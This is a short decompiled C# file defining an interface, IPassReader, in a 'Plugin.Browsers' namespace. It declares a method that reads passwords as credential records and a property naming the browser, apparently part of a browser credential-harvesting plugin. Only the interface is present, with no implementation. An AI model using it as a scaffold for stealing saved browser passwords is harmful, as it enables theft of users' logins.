using System;
using System.Collections.Generic;

namespace Plugin.Browsers
{
	// Token: 0x0200000E RID: 14
	internal interface IPassReader
	{
		// Token: 0x0600006D RID: 109
		IEnumerable<CredentialModel> ReadPasswords();

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600006E RID: 110
		string BrowserName { get; }
	}
}
